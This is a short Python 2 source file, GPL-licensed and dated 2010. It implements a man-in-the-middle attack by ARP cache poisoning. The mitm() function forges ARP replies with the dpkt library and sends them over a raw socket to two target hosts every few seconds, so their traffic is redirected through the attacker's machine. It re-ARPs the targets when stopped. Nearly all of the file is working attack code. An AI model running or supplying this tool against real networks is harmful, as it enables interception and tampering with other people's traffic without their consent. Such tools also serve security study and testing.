##########################################################################
# Copyright (C) Chatzopoulos Dimos 2010 <dimosch@linuxteam.cs.teilar.gr> #
#									 #
# This program is free software: you can redistribute it and/or modify	 #
# it under the terms of the GNU General Public License as published by   #
# the Free Software Foundation, either version 3 of the License, or	 #	
# (at your option) any later version.					 #
#									 #
# This program is distributed in the hope that it will be useful,	 #
# but WITHOUT ANY WARRANTY; without even the implied warranty of	 #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the		 #
# GNU General Public License for more details.				 #
#									 #
# You should have received a copy of the GNU General Public License	 #
# along with this program.  If not, see <http://www.gnu.org/licenses/>.	 #
##########################################################################

import dpkt
import socket
import time
import functs

#Perform Man-In-The-Middle attack, with ARP cache poisoning
def mitm(target1, target2, device):
	arp1 = dpkt.arp.ARP() # create ARP obejcts
	arp2 = dpkt.arp.ARP()

	arp2.op = arp1.op = dpkt.arp.ARP_OP_REPLY # set the ARP opcode
	arp2.sha = arp1.sha = functs.eth_aton(functs.getDeviceMac(device)) # get the local mac address and assign it 
	
	arp1.tha = functs.eth_aton(functs.getMac(target1, device)) # get mac address for targets
	arp2.tha = functs.eth_aton(functs.getMac(target2, device))
	arp1.spa = socket.inet_aton(target2)
	arp2.spa = socket.inet_aton(target1)
	arp1.tpa = socket.inet_aton(target1)
	arp2.tpa = socket.inet_aton(target2)
	
	eth1 = dpkt.ethernet.Ethernet() # create Ethernet objects
	eth2 = dpkt.ethernet.Ethernet()
	
	eth1.src = eth2.src = functs.eth_aton(functs.getDeviceMac(device))
	eth1.dst = arp1.tha
	eth2.dst = arp2.tha
	
	eth1.data = arp1 # assign ARP objects to ethernet object data
	eth2.data = arp2
	
	eth1.type = eth2.type = dpkt.ethernet.ETH_TYPE_ARP # set the ethernet type

	s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW) # create PF_PACKET socket instance
	s.bind((device, dpkt.ethernet.ETH_TYPE_ARP)) # bind the socket
	print 'Poisoning',target1,'and', target2,'...\n\n'
	while 1:
                try:
                        
			s.send(eth1.pack())# send frame1@target1
                        s.send(eth2.pack()) # send frame2@target2
			time.sleep(5) # delay seconds

                except KeyboardInterrupt: # stop at keyboard interupt
                        print "\n\n MITM attack stopped. \n"
			# Restore targets' ARP cache
			arp2.sha = eth1.dst
			arp1.sha = eth2.dst
			eth1.data = arp1
        		eth2.data = arp2
			print 're-ARPing',target1,'...',
			s.send(eth1.pack())
			print 'Done!\n'
                        
			print 're-ARPing',target2,'...',
			s.send(eth2.pack())
			print 'Done!\n'
			
			s.close() # close socket
			break

